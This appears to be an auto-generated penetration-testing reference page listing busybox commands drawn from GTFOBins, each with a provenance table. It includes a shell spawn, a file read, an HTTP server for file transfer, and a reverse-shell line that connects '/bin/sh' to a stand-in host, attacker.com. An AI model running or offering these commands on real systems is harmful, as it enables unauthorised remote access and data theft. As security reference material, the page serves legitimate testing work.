---
parsed_by: focuslocust
source: commands
type: generated
---
# busybox Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## busybox

Tool page: [busybox](../../tools/linux/busybox.md)

### inherit

```text
busybox ash
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/busybox` |
| Evidence | Function example preserved from source parser. |

### inherit

```text
busybox cat
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/busybox` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
busybox nc -e /bin/sh attacker.com 12345
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/busybox` |
| Evidence | Function example preserved from source parser. |

### upload

```text
busybox httpd -f -p 12345 -h .
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/busybox` |
| Evidence | Function example preserved from source parser. |
